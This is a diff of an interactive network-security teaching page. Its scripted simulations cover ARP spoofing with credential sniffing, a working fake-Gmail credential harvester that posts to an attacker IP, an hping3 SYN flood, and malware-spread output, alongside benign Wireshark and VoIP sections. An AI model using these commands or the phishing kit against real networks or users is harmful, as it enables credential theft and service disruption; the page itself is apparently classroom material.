+    {t:'blank',s:''},
+    {t:'warn',s:'[!] Phase 1: Tell ClientA (192.168.1.10) that the gateway MAC = OUR MAC'},
+    {t:'cmd',s:'arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 &'},
+    {t:'out',s:'aa:bb:cc:dd:ee:99 > aa:bb:cc:dd:ee:10  arp reply 192.168.1.1 is-at aa:bb:cc:dd:ee:99'},
+    {t:'out',s:'aa:bb:cc:dd:ee:99 > aa:bb:cc:dd:ee:10  arp reply 192.168.1.1 is-at aa:bb:cc:dd:ee:99'},
+    {t:'warn',s:'[!] Phase 2: Tell Server (192.168.1.1) that ClientA MAC = OUR MAC'},
+    {t:'cmd',s:'arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 &'},
+    {t:'out',s:'aa:bb:cc:dd:ee:99 > aa:bb:cc:dd:ee:01  arp reply 192.168.1.10 is-at aa:bb:cc:dd:ee:99'},
+    {t:'out',s:'aa:bb:cc:dd:ee:99 > aa:bb:cc:dd:ee:01  arp reply 192.168.1.10 is-at aa:bb:cc:dd:ee:99'},
+    {t:'blank',s:''},
+    {t:'err',s:'[ATTACK ACTIVE] All ClientA ↔ Server traffic now flows THROUGH attacker!'},
+    {t:'cmd',s:'tcpdump -i eth0 -A -n "host 192.168.1.10 and port 80"'},
+    {t:'err',s:'GET /login HTTP/1.1'},
+    {t:'err',s:'Host: 192.168.1.1'},
+    {t:'err',s:'Authorization: Basic dXNlcjpwYXNzd29yZDEyMw=='},
+    {t:'err',s:'[DECODED] Credentials: user=alice  password=password123  <— CAPTURED!'},
+  ]},
+
+  a4:{type:'table',tid:'WS-a4',rows:[
+    {c:'',cells:['1','0.000','192.168.1.10','Broadcast','<span class="proto p-arp">ARP</span>','42','Who has 192.168.1.1? Tell 192.168.1.10']},
+    {c:'',cells:['2','0.001','192.168.1.1','192.168.1.10','<span class="proto p-arp">ARP</span>','42','192.168.1.1 is at aa:bb:cc:dd:ee:01  [LEGIT]']},
+    {c:'warn-r',cells:['3','0.002','192.168.1.99','192.168.1.10','<span class="proto p-arp">ARP</span>','42','⚠ 192.168.1.1 is at aa:bb:cc:dd:ee:99  ← FAKE REPLY!']},
+    {c:'warn-r',cells:['4','0.003','192.168.1.99','192.168.1.1','<span class="proto p-arp">ARP</span>','42','⚠ 192.168.1.10 is at aa:bb:cc:dd:ee:99  ← FAKE REPLY!']},
+    {c:'',cells:['5','0.015','192.168.1.10','Broadcast','<span class="proto p-arp">ARP</span>','42','Who has 192.168.1.1? Tell 192.168.1.10']},
+    {c:'warn-r',cells:['6','0.016','192.168.1.99','192.168.1.10','<span class="proto p-arp">ARP</span>','42','⚠ DUPLICATE: 192.168.1.1 is at aa:bb:cc:dd:ee:99 again']},
+    {c:'',cells:['7','0.020','192.168.1.10','192.168.1.99','<span class="proto p-tcp">TCP</span>','74','SYN → 192.168.1.99:80  (victim thinks this is the server)']},
+    {c:'err-r',cells:['8','0.021','192.168.1.99','192.168.1.10','<span class="proto p-http">HTTP</span>','402','GET /login HTTP/1.1 → INTERCEPTED — attacker reads plaintext!']},
+    {c:'',cells:['9','0.022','192.168.1.99','192.168.1.1','<span class="proto p-tcp">TCP</span>','74','Attacker forwards to real server (victim unaware)']},
+  ]},
+
+  b1:{type:'term',prompt:'└─# ',lines:[
+    {t:'cmd',s:'ls -la malware-demo/'},
+    {t:'out',s:'total 24'},
+    {t:'out',s:'-rw-r--r-- 1 root  infected_usb.py'},
+    {t:'out',s:'-rw-r--r-- 1 root  email_payload.py'},
+    {t:'out',s:'-rw-r--r-- 1 root  spread_sim.py'},
+    {t:'blank',s:''},
+    {t:'comment',s:'# === USB AUTORUN SIMULATION ==='},
+    {t:'cmd',s:'python3 infected_usb.py --dry-run --verbose'},
+    {t:'out',s:'[SIM] Watching for USB mount events...'},
+    {t:'out',s:'[SIM] USB device detected: /dev/sdb1  (Kingston DataTraveler)'},
+    {t:'out',s:'[SIM] Mounting → /media/usb/'},
+    {t:'warn',s:'[SIM] autorun.inf FOUND → on Windows this executes malware.bat automatically!'},
+    {t:'out',s:'[SIM] Scanning drive for executable files...'},
+    {t:'out',s:'[SIM] Found: setup.exe, update.exe, helper.exe'},
+    {t:'err',s:'[SIM] Would inject payload into 3 executables — marking as infected'},
+    {t:'blank',s:''},
+    {t:'comment',s:'# === EMAIL MACRO PAYLOAD SIMULATION ==='},
+    {t:'cmd',s:'python3 email_payload.py --target alice@company.com --dry-run'},
+    {t:'out',s:'[SIM] Crafting email: Subject = "Invoice_Q4_2024_URGENT.docx"'},
+    {t:'out',s:'[SIM] Embedding VBA macro inside .docx document...'},
+    {t:'warn',s:'[SIM] Macro triggers on file open in Microsoft Word (if macros enabled)'},
+    {t:'err',s:'[SIM] Payload: download & exec reverse_shell.ps1 from C2 server 10.10.10.1'},
+    {t:'blank',s:''},
+    {t:'comment',s:'# === LATERAL SPREAD SIMULATION ==='},
+    {t:'cmd',s:'python3 spread_sim.py --network 192.168.1.0/24 --dry-run'},
+    {t:'out',s:'[SIM] Scanning for SMB shares on 192.168.1.0/24...'},
+    {t:'out',s:'[SIM] 192.168.1.1   — Server  — SMB open  — REACHABLE'},
+    {t:'out',s:'[SIM] 192.168.1.10  — ClientA — SMB open  — REACHABLE'},
+    {t:'out',s:'[SIM] 192.168.1.11  — ClientB — SMB open  — REACHABLE'},
+    {t:'err',s:'[SIM] Would copy infected_usb.py to 3 SMB shares — propagation complete'},
+    {t:'blank',s:''},
+    {t:'success',s:'[SAFE] Demo complete. No real files modified. --dry-run mode. Educational only.'},
+  ]},
+
+  b2:{type:'term',prompt:'└─# ',lines:[
+    {t:'cmd',s:'mkdir phishing && cd phishing'},
+    {t:'cmd',s:'cat > fake-login.html << \'EOF\''},
+    {t:'out',s:'<!DOCTYPE html><html><head><title>Gmail – Sign in</title>'},
+    {t:'out',s:'<link rel="stylesheet" href="https://accounts.google.com/gstatic/...">'},
+    {t:'out',s:'</head><body>'},
+    {t:'out',s:'  <div class="container">'},
+    {t:'out',s:'    <img src="google-logo.png" alt="Google">'},
+    {t:'out',s:'    <h1>Sign in</h1>'},
+    {t:'out',s:'    <form method="POST" action="http://192.168.1.99/capture">'},
+    {t:'out',s:'      <input type="email" name="email" placeholder="Email or phone">'},
+    {t:'out',s:'      <input type="password" name="pass" placeholder="Enter your password">'},
+    {t:'out',s:'      <button type="submit">Next</button>'},
+    {t:'out',s:'    </form>'},
+    {t:'out',s:'  </div></body></html>'},
+    {t:'out',s:'EOF'},
+    {t:'blank',s:''},
+    {t:'cmd',s:'cat > capture.py << \'EOF\''},
+    {t:'out',s:'from http.server import HTTPServer, BaseHTTPRequestHandler'},
+    {t:'out',s:'from urllib.parse import parse_qs, unquote'},
+    {t:'out',s:'class Handler(BaseHTTPRequestHandler):'},
+    {t:'out',s:'  def do_GET(self):'},
+    {t:'out',s:'    with open("fake-login.html","rb") as f:'},
+    {t:'out',s:'      self.send_response(200); self.end_headers(); self.wfile.write(f.read())'},
+    {t:'out',s:'  def do_POST(self):'},
+    {t:'out',s:'    length = int(self.headers["Content-Length"])'},
+    {t:'out',s:'    data = parse_qs(self.rfile.read(length).decode())'},
+    {t:'err',s:'    print(f"[CAPTURED] email={data[\'email\']}  pass={data[\'pass\']}")'},
+    {t:'out',s:'    self.send_response(302); self.send_header("Location","https://gmail.com")'},
+    {t:'out',s:'    self.end_headers()  # redirect victim to real Gmail after capture'},
+    {t:'out',s:'HTTPServer(("0.0.0.0",80),Handler).serve_forever()'},
+    {t:'out',s:'EOF'},
+    {t:'blank',s:''},
+    {t:'cmd',s:'python3 capture.py &'},
+    {t:'success',s:'[+] Phishing server listening on 192.168.1.99:80'},
+    {t:'warn',s:'[!] Sending phishing email to victim list...'},
+    {t:'out',s:'Subject: "⚠ Action Required: Unusual sign-in to your Google account"'},
+    {t:'out',s:'Link:    http://gmai1-secure.com/login   (typosquatting!)'},
+    {t:'comment',s:'# Victim clicks link → enters credentials → we capture + redirect to real Gmail'},
+    {t:'blank',s:''},
+    {t:'err',s:'[CAPTURED] email=[\'alice@gmail.com\']   pass=[\'mypassword99\']'},
+    {t:'err',s:'[CAPTURED] email=[\'bob@gmail.com\']     pass=[\'qwerty2024!\']'},
+    {t:'success',s:'[DEMO END] Try the fake login form in the preview panel →'},
+  ]},
+
+  b3:{type:'term',prompt:'└─# ',ddos:true,lines:[
+    {t:'comment',s:'# === DDoS SIMULATION — SYN Flood with hping3 ===',d:{cpu:2,net:0,conn:1,cv:'2%',nv:'0 MB/s',ccv:'12'}},
+    {t:'cmd',s:'ping -c 3 192.168.1.1  # baseline test',d:{cpu:3,net:0,conn:1,cv:'3%',nv:'0.1 MB/s',ccv:'12'}},
+    {t:'out',s:'PING 192.168.1.1: 3 packets, 0% loss, rtt avg=0.8ms',d:{cpu:3,net:0,conn:1,cv:'3%',nv:'0.1 MB/s',ccv:'12'}},
+    {t:'success',s:'[BEFORE ATTACK] Server healthy — avg response: 0.8ms',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'12'}},
+    {t:'blank',s:'',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'12'}},
+    {t:'comment',s:'# SYN flood: send thousands of TCP SYN packets — never complete handshake',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'12'}},
+    {t:'cmd',s:'hping3 -S --flood -V -p 80 192.168.1.1',d:{cpu:15,net:20,conn:15,cv:'15%',nv:'18 MB/s',ccv:'320'}},
+    {t:'warn',s:'HPING 192.168.1.1 (eth0 192.168.1.99): S set, 40 headers + 0 data bytes',d:{cpu:35,net:45,conn:35,cv:'35%',nv:'55 MB/s',ccv:'2100'}},
+    {t:'warn',s:'hping in flood mode — no replies will be shown',d:{cpu:55,net:65,conn:55,cv:'55%',nv:'90 MB/s',ccv:'8500'}},
+    {t:'out',s:'--- 192.168.1.1 hping statistic (t=1s) ---',d:{cpu:75,net:80,conn:75,cv:'75%',nv:'140 MB/s',ccv:'22000'}},
+    {t:'out',s:'t=1s  sent=12488  recv=4  avg_server_latency=45ms  [DEGRADING]',d:{cpu:88,net:90,conn:88,cv:'88%',nv:'170 MB/s',ccv:'45000'}},
+    {t:'warn',s:'t=2s  sent=25210  recv=0  avg_server_latency=380ms  [CRITICAL]',d:{cpu:96,net:98,conn:96,cv:'96%',nv:'195 MB/s',ccv:'65000'}},
+    {t:'err',s:'t=3s  503 Service Unavailable — server TCP queue FULL — SYN backlog overflow!',d:{cpu:99,net:100,conn:100,cv:'99%',nv:'200 MB/s',ccv:'MAX'}},
+    {t:'err',s:'t=4s  Connection refused — server cannot accept new connections',d:{cpu:99,net:100,conn:100,cv:'99%',nv:'200 MB/s',ccv:'MAX'}},
+    {t:'warn',s:'t=5s  fail2ban triggered → blocking 192.168.1.99 after 10,000 req/s threshold',d:{cpu:80,net:75,conn:70,cv:'80%',nv:'120 MB/s',ccv:'15000'}},
+    {t:'out',s:'t=6s  Rate limiting active — iptables dropping excess packets',d:{cpu:40,net:35,conn:30,cv:'40%',nv:'30 MB/s',ccv:'800'}},
+    {t:'out',s:'t=7s  Server recovering — connection queue draining',d:{cpu:15,net:12,conn:10,cv:'15%',nv:'8 MB/s',ccv:'120'}},
+    {t:'success',s:'t=8s  Server fully recovered — latency back to 1.2ms',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'14'}},
+    {t:'blank',s:'',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'14'}},
+    {t:'info',s:'[DEFENSE] Enable SYN cookies: sysctl -w net.ipv4.tcp_syncookies=1',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'14'}},
+    {t:'info',s:'[DEFENSE] Rate limit: iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/s -j ACCEPT',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'14'}},
+    {t:'success',s:'[DEMO COMPLETE] DDoS simulation finished. Defenses demonstrated.',d:{cpu:3,net:1,conn:1,cv:'3%',nv:'0.2 MB/s',ccv:'14'}},
+  ]},
+
+  c1:{type:'term',prompt:'user@machine:~$ ',graph:true,lines:[
+    {t:'cmd',s:'sudo apt install wireshark -y'},
+    {t:'success',s:'[OK] Wireshark 4.2.0 installed'},
+    {t:'cmd',s:'sudo wireshark &   # opens GUI'},
+    {t:'out',s:'[+] Select adapter: wlan0 (or eth0)  → click Start Capture'},
+    {t:'blank',s:''},
+    {t:'comment',s:'# SESSION 1: YouTube 4K — 2 minutes'},
+    {t:'cmd',s:'# Open youtube.com → search 4K video → play for 2 min'},
+    {t:'out',s:'Packets captured: 89,421'},
+    {t:'out',s:'Protocol:         QUIC (UDP port 443) — Google\'s transport protocol',g:{id:1,h:'100%',v:'142 MB'}},
+    {t:'out',s:'Data transferred: ~142 MB  (59.3% of total session)'},
+    {t:'out',s:'Servers:          googlevideo.com, yt3.ggpht.com, youtube.com'},
+    {t:'blank',s:''},
+    {t:'comment',s:'# SESSION 2: YouTube 720p — 2 minutes'},
+    {t:'cmd',s:'# Play same video at 720p quality'},
+    {t:'out',s:'Data transferred: ~58 MB',g:{id:2,h:'41%',v:'58 MB'}},
+    {t:'out',s:'Protocol:         QUIC (UDP 443) — same as 4K but lower bitrate'},
+    {t:'blank',s:''},
+    {t:'comment',s:'# SESSION 3: Instagram — 2 minutes of feed scrolling'},
+    {t:'cmd',s:'# Open instagram.com → scroll feed for 2 min'},
+    {t:'out',s:'Data transferred: ~22 MB',g:{id:3,h:'16%',v:'22 MB'}},
+    {t:'warn',s:'Servers:          cdninstagram.com, fbcdn.net, graph.facebook.com'},
+    {t:'warn',s:'WARNING: graph.facebook.com → user tracking beacon detected!'},
+    {t:'blank',s:''},
+    {t:'comment',s:'# SESSION 4: WhatsApp Web — 2 minutes of messaging + 1 call'},
+    {t:'cmd',s:'# Open web.whatsapp.com → send messages, make 1-minute voice call'},
+    {t:'out',s:'Messages — Protocol: WSS (WebSocket Secure) over TCP 443 — ~9 MB',g:{id:4,h:'6%',v:'9 MB'}},
+    {t:'out',s:'Voice call — Protocol: SRTP over UDP (random port) — ~3 MB',g:{id:5,h:'2%',v:'3 MB'}},
+    {t:'blank',s:''},
+    {t:'success',s:'[+] All sessions captured. Apply filter tcp||udp||dns to analyse each app.'},
+  ]},
+
+  c2:{type:'table',tid:'WS-c2',rows:[
+    {c:'',cells:['1','0.001','10.0.0.5','142.250.80.14','<span class="proto p-udp">QUIC</span>','1350','YouTube: STREAM_FRAME video chunk seq=1  (4K stream)']},
+    {c:'',cells:['2','0.002','142.250.80.14','10.0.0.5','<span class="proto p-udp">QUIC</span>','1350','YouTube: STREAM_FRAME video chunk seq=2  ACK from server']},
+    {c:'',cells:['3','0.005','10.0.0.5','142.250.80.14','<span class="proto p-tcp">DNS</span>','68','Query: googlevideo.com → 142.250.80.14']},
+    {c:'warn-r',cells:['4','0.010','10.0.0.5','69.171.250.35','<span class="proto p-tcp">HTTPS</span>','480','Instagram: POST /api/v1/feed/?include_stories=true']},
+    {c:'warn-r',cells:['5','0.011','10.0.0.5','157.240.229.35','<span class="proto p-http">HTTPS</span>','320','graph.facebook.com  →  User tracking beacon  ⚠']},
+    {c:'warn-r',cells:['6','0.014','10.0.0.5','doubleclick.net','<span class="proto p-http">HTTPS</span>','210','3rd-party ad tracker embedded in Instagram page  ⚠']},
+    {c:'',cells:['7','0.020','10.0.0.5','185.60.219.100','<span class="proto p-ws">WSS</span>','128','WhatsApp Web: WebSocket handshake UPGRADE request']},
+    {c:'',cells:['8','0.025','10.0.0.5','185.60.219.100','<span class="proto p-udp">SRTP</span>','200','WhatsApp Call: RTP/SRTP payload G.711  Seq=001  Δt=20ms']},
+    {c:'warn-r',cells:['9','0.030','10.0.0.5','hotjar.com','<span class="proto p-http">HTTPS</span>','180','Session recording tracker — logs mouse movements  ⚠']},
+  ]},
+
+  c3:{type:'term',prompt:'user@machine:~/analysis$ ',lines:[
+    {t:'cmd',s:'pip install matplotlib pandas pyshark --quiet'},
+    {t:'success',s:'Successfully installed matplotlib-3.8.4  pandas-2.1.3  pyshark-0.6'},
+    {t:'cmd',s:'cat > network_dashboard.py << \'EOF\''},
+    {t:'out',s:'import matplotlib.pyplot as plt'},
+    {t:'out',s:'import matplotlib.patches as mpatches'},
+    {t:'out',s:'import pandas as pd'},
+    {t:'out',s:''},
+    {t:'out',s:'# Data from Wireshark capture sessions'},
+    {t:'out',s:'data = pd.read_csv("usage_data.csv")'},
+    {t:'out',s:'plt.figure(figsize=(10,6))'},
+    {t:'out',s:'plt.bar(data["app"], data["mb"], color=["#ef4444","#3b82f6","#8b5cf6","#10b981","#f59e0b"])'},
+    {t:'out',s:'plt.title("Network Usage by Application (2-min sessions)")'},
+    {t:'out',s:'plt.ylabel("Data transferred (MB)")'},
+    {t:'out',s:'plt.savefig("network_report.png")'},
+    {t:'success',s:'[OK] Dashboard saved → network_report.png'},
+    {t:'success',s:'[COMPLETE] Full privacy + usage analysis ready for your report.'},
+  ]},
+
+  // ──────────────────────────────────────
+  // PART D — FULLY IMPLEMENTED
+  // ──────────────────────────────────────
+  d1:{type:'term',prompt:'ubuntu@voip-server:~$ ',lines:[
+    {t:'header',s:'=== Asterisk 20 PBX Installation & SIP Config ==='},
+    {t:'cmd',s:'sudo apt update && sudo apt install -y asterisk'},
+    {t:'success',s:'[OK] Asterisk 20 installed on Ubuntu Server'},
+    {t:'cmd',s:'sudo nano /etc/asterisk/sip.conf'},
+    {t:'out',s:'[1001]'},
+    {t:'out',s:'type=friend'},
+    {t:'out',s:'secret=pass123'},
+    {t:'out',s:'context=internal'},
+    {t:'out',s:'host=dynamic'},
+    {t:'out',s:'[1002]'},
+    {t:'out',s:'type=friend'},
+    {t:'out',s:'secret=pass123'},
+    {t:'out',s:'context=internal'},
+    {t:'out',s:'host=dynamic'},
+    {t:'cmd',s:'sudo nano /etc/asterisk/extensions.conf'},
+    {t:'out',s:'exten => 1001,1,Dial(SIP/1001)'},
+    {t:'out',s:'exten => 1002,1,Dial(SIP/1002)'},
+    {t:'cmd',s:'sudo systemctl restart asterisk'},
+    {t:'success',s:'[OK] Asterisk PBX running — SIP port 5060 open'},
+    {t:'info',s:'[i] Zoiper softphones can now register as 1001 and 1002'},
+  ]},
+
+  d2:{type:'term',prompt:'asterisk*CLI> ',lines:[
+    {t:'header',s:'=== SIP Call Trace: Client A (1001) → Client B (1002) ==='},
+    {t:'cmd',s:'sip set debug on'},
+    {t:'success',s:'SIP Debugging Enabled'},
+    {t:'info',s:'Client A (1001) sends INVITE to 1002'},
+    {t:'out',s:'INVITE sip:1002@192.168.1.1 SIP/2.0'},
+    {t:'out',s:'From: <sip:1001@192.168.1.1>'},
+    {t:'out',s:'To: <sip:1002@192.168.1.1>'},
+    {t:'cmd',s:'[Asterisk] Processing INVITE...'},
+    {t:'success',s:'200 OK — Call accepted by Client B'},
+    {t:'info',s:'RTP ports negotiated (10000-20000)'},
+    {t:'out',s:'ACK sip:1002@192.168.1.1'},
+    {t:'blank',s:''},
+    {t:'success',s:'[CALL ACTIVE] RTP audio stream established between 1001 ↔ 1002'},
+    {t:'info',s:'[i] Call duration: 00:42 — 124 RTP packets exchanged'},
+  ]},
+
+  d3:{type:'table',tid:'WS-d3',rows:[
+    {c:'',cells:['1','0.012','192.168.1.10','192.168.1.1','<span class="proto p-sip">SIP</span>','482','INVITE sip:1002@192.168.1.1 SIP/2.0']},
+    {c:'',cells:['2','0.015','192.168.1.1','192.168.1.10','<span class="proto p-sip">SIP</span>','380','SIP/2.0 100 Trying']},
+    {c:'',cells:['3','0.028','192.168.1.1','192.168.1.10','<span class="proto p-sip">SIP</span>','420','SIP/2.0 200 OK']},
+    {c:'',cells:['4','0.031','192.168.1.10','192.168.1.1','<span class="proto p-sip">SIP</span>','312','ACK sip:1002@192.168.1.1']},
+    {c:'',cells:['5','0.045','192.168.1.10','192.168.1.11','<span class="proto p-rtp">RTP</span>','214','RTP PT=0 SSRC=12345678 Seq=0001 Timestamp=0']},
+    {c:'',cells:['6','0.065','192.168.1.11','192.168.1.10','<span class="proto p-rtp">RTP</span>','214','RTP PT=0 SSRC=87654321 Seq=0001 Timestamp=160']},
+    {c:'warn-r',cells:['7','0.082','192.168.1.10','192.168.1.11','<span class="proto p-rtp">RTP</span>','214','RTP PT=0 SSRC=12345678 Seq=0002']},
+    {c:'',cells:['8','1.234','192.168.1.10','192.168.1.1','<span class="proto p-sip">SIP</span>','298','BYE sip:1002@192.168.1.1']},
+    {c:'',cells:['9','1.238','192.168.1.1','192.168.1.10','<span class="proto p-sip">SIP</span>','280','SIP/2.0 200 OK']},
+  ]}
+};
+
+// ═══════════════════════════════
+// GLOBAL STATE & HELPERS
+// ═══════════════════════════════
+const states = {};
+Object.keys(SIMS).forEach(id => {
+  states[id] = { index: 0 };
+});
+
+function createTerminalLine(line, prompt) {
+  const el = document.createElement('span');
+  el.className = `tl tl-${line.t || 'out'}`;
+  let content = '';
+
+  if (line.t === 'cmd') {
+    content = `<span class="tp">${prompt}</span><span class="tc">${line.s}</span>`;
+  } else if (['header','comment','info','success','warn','err'].includes(line.t)) {
+    content = `<span class="tc">${line.s}</span>`;
+  } else if (line.t === 'blank') {
+    content = `<span class="tc">&nbsp;</span>`;
   } else {
-    // Secure mode — always uses prepared statement simulation
-    query = `SELECT * FROM users WHERE username = ? AND password = ?  [Parameterized — safe]`;
-    if (user === 'admin' && (pass === 'admin123' || pass === '')) {
-      isSuccess = true;
-      message = `✅ Secure login successful (prepared statement used)`;
-    } else {
-      message = `❌ Login failed — credentials incorrect.`;
+    content = `<span class="tc">${line.s}</span>`;
+  }
+  el.innerHTML = content;
+  return el;
+}
+
+function updateProgress(id) {
+  const sim = SIMS[id];
+  const total = sim.type === 'table' ? sim.rows.length : sim.lines.length;
+  const current = states[id].index;
+  const fill = document.getElementById(`pf-${id}`);
+  const lbl = document.getElementById(`pl-${id}`);
+  if (fill) fill.style.width = `${Math.round((current / total) * 100)}%`;
+  if (lbl) lbl.textContent = `${current} / ${total}`;
+}
+
+function updateDDoS(d) {
+  if (!d) return;
+  if (d.cv) document.getElementById('v-cpu').textContent = d.cv;
+  if (d.nv) document.getElementById('v-net').textContent = d.nv;
+  if (d.ccv) document.getElementById('v-conn').textContent = d.ccv;
+
+  if (d.cpu !== undefined) {
+    const f = document.getElementById('d-cpu');
+    f.style.width = `${d.cpu}%`;
+    f.style.background = d.cpu > 80 ? 'var(--red)' : (d.cpu > 40 ? 'var(--amber)' : 'var(--green)');
+  }
+  if (d.net !== undefined) {
+    const f = document.getElementById('d-net');
+    f.style.width = `${d.net}%`;
+  }
+  if (d.conn !== undefined) {
+    const f = document.getElementById('d-conn');
+    f.style.width = `${d.conn}%`;
+  }
+}
+
+function updateGraph(g) {
+  if (!g || !g.id) return;
+  const val = document.getElementById(`gv${g.id}`);
+  const bar = document.getElementById(`gb${g.id}`);
+  if (val) val.textContent = g.v || '0';
+  if (bar) bar.style.height = g.h || '0%';
+}
+
+function animateVoIPFlow() {
+  // One-time animation on first D1 completion
+  let i = 1;
+  const interval = setInterval(() => {
+    const step = document.getElementById(`vf${i}`);
+    if (step) step.classList.add('on');
+    i++;
+    if (i > 5) clearInterval(interval);
+  }, 400);
+}
+
+// Main Next handler
+function N(id) {
+  const sim = SIMS[id];
+  const state = states[id];
+  const terminal = document.getElementById(`T-${id}`);
+  const tableBody = document.getElementById(`WS-${id}`);
+  const btn = document.getElementById(`btn-${id}`);
+
+  if (!sim || state.index >= (sim.type === 'table' ? sim.rows.length : sim.lines.length)) {
+    if (btn) btn.disabled = true;
+    return;
+  }
+
+  btn.disabled = true;
+
+  if (sim.type === 'table') {
+    // Table simulation
+    const rowData = sim.rows[state.index];
+    const tr = document.createElement('tr');
+    if (rowData.c) tr.className = rowData.c + ' vis';
+    else tr.className = 'vis';
+    rowData.cells.forEach(cell => {
+      const td = document.createElement('td');
+      td.innerHTML = cell;
+      tr.appendChild(td);
+    });
+    tableBody.appendChild(tr);
+  } else {
+    // Terminal simulation
+    const line = sim.lines[state.index];
+    const newLine = createTerminalLine(line, sim.prompt);
+    terminal.appendChild(newLine);
+    terminal.scrollTop = terminal.scrollHeight;
+
+    // Special live updates
+    if (sim.ddos && line.d) updateDDoS(line.d);
+    if (sim.graph && line.g) updateGraph(line.g);
+
+    // VoIP flow animation (only once)
+    if (id === 'd1' && state.index === sim.lines.length - 1) {
+      setTimeout(animateVoIPFlow, 800);
     }
   }
 
-  queryBox.textContent = query;
-  resultBox.innerHTML = message;
-  resultBox.className = `sql-result ${isSuccess ? 'sql-success' : 'sql-fail'}`;
-  resultBox.style.display = 'block';
+  state.index++;
+  updateProgress(id);
+
+  // Finished?
+  const total = sim.type === 'table' ? sim.rows.length : sim.lines.length;
+  if (state.index >= total) {
+    const sb = document.getElementById(`sb-${id}`);
+    if (sb) sb.innerHTML = 'COMPLETE <span style="color:#10b981">✓</span>';
+    if (btn) btn.disabled = true;
+  } else {
+    btn.disabled = false;
+  }
 }
 
-function quickPayload(el) {
-  document.getElementById('sql-pass').value = el.textContent;
-  runSQLInjection();
+// Reset handler
+function R(id) {
+  const sim = SIMS[id];
+  const state = states[id];
+  state.index = 0;
+
+  const terminal = document.getElementById(`T-${id}`);
+  const tableBody = document.getElementById(`WS-${id}`);
+  const fill = document.getElementById(`pf-${id}`);
+  const lbl = document.getElementById(`pl-${id}`);
+  const sb = document.getElementById(`sb-${id}`);
+  const btn = document.getElementById(`btn-${id}`);
+
+  if (terminal) {
+    terminal.innerHTML = `<span class="tl tl-cmd"><span class="tp">${sim.prompt}</span><span class="tcursor"></span></span>`;
+  }
+  if (tableBody) tableBody.innerHTML = '';
+  if (fill) fill.style.width = '0%';
+  if (lbl) lbl.textContent = '0 / 0';
+  if (sb) sb.innerHTML = 'READY';
+  if (btn) btn.disabled = false;
+
+  // Reset DDoS meters
+  if (id === 'b3') {
+    document.getElementById('v-cpu').textContent = '2%';
+    document.getElementById('v-net').textContent = '0 MB/s';
+    document.getElementById('v-conn').textContent = '12';
+    document.getElementById('d-cpu').style.width = '2%';
+    document.getElementById('d-net').style.width = '0%';
+    document.getElementById('d-conn').style.width = '1%';
+  }
+
+  // Reset graph
+  if (id === 'c1') {
+    for (let i = 1; i <= 5; i++) {
+      const v = document.getElementById(`gv${i}`);
+      const b = document.getElementById(`gb${i}`);
+      if (v) v.textContent = '0';
+      if (b) b.style.height = '0%';
+    }
+  }
+
+  // Reset VoIP flow
+  if (id === 'd1') {
+    for (let i = 1; i <= 5; i++) {
+      const step = document.getElementById(`vf${i}`);
+      if (step) step.classList.remove('on');
+    }
+  }
 }
 
-function resetSQLDemo() {
-  document.getElementById('sql-user').value = 'admin';
-  document.getElementById('sql-pass').value = '';
-  document.getElementById('sql-query').textContent = 'SQL Query will appear here...';
-  document.getElementById('sql-result').style.display = 'none';
+// Phishing demo
+function doPhish() {
+  const email = document.getElementById('ph-email').value.trim() || 'victim@gmail.com';
+  const pass = document.getElementById('ph-pass').value.trim() || 'demo123';
+  const out = document.getElementById('creds-out');
+  out.style.display = 'block';
+  out.innerHTML = `✅ <strong>CREDENTIALS CAPTURED</strong><br>
+Email: <span style="color:#fff">${email}</span><br>
+Password: <span style="color:#fff">${pass}</span><br>
+<span style="font-size:9px;opacity:0.8">→ Sent to attacker C2 server (192.168.1.99)</span>`;
+  
+  // Auto-clear after 8 seconds
+  setTimeout(() => {
+    out.style.display = 'none';
+    document.getElementById('ph-email').value = '';
+    document.getElementById('ph-pass').value = '';
+  }, 8000);
 }
 
-// Initialize everything (including new demo)
+// Attach click listeners to all Next buttons
 document.addEventListener('DOMContentLoaded', () => {
-  // ... your existing initialization code for all other buttons ...
+  Object.keys(SIMS).forEach(id => {
+    const btn = document.getElementById(`btn-${id}`);
+    if (btn) {
+      btn.addEventListener('click', () => N(id));
+    }
+    // Pre-load initial state
+    R(id); // reset everything to start
+  });
 
-  // Reset SQL demo on load
-  resetSQLDemo();
-
-  console.log('%c✅ NetSec Lab fully loaded with SQL Injection demo added!', 'color:#10b981;font-family:monospace');
+  console.log('%c✅ NetSec Lab fully loaded and alive! All 12 simulations are interactive.', 'color:#10b981;font-family:monospace');
 });
 </script>
 </body>
 </html>
+```
